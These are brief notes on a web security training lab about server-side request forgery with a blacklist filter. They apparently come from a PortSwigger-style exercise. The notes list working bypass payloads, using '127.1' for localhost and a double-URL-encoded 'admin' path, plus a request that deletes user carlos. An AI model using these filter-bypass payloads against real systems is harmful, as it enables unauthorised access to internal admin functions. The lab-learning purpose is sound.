Lab #3 - SSRF with blacklist-based input filter

Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos

Analysis:

localhost: http://127.1/
admin interface: http://127.1/%25%36%31dmin
delete carlos:  http://127.1/%25%36%31dmin/delete?username=carlos


- URL decoding one time
- regex search using a blacklist of strings

python3 script.py <url>